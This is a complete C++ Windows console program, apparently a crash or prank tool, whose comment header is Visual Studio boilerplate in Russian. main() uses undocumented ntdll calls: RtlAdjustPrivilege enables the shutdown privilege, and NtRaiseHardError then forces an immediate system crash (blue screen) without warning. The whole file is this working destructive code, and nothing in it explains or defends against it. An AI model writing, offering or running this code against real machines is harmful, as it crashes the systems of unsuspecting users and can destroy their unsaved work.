// ConsoleApplication12.cpp: определяет точку входа для консольного приложения.
//
#include "stdafx.h"
#include <windows.h>
#include "resource.h"

#pragma comment(lib , "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege (ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberParametrs, ULONG UnicodeStringParameter,
	PULONG_PTR Parameters, ULONG ValidRespOption, PULONG Response);

int main()
{

	
	BOOLEAN bl;
	unsigned long response;
	RtlAdjustPrivilege(19, true, false, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	return 0;
}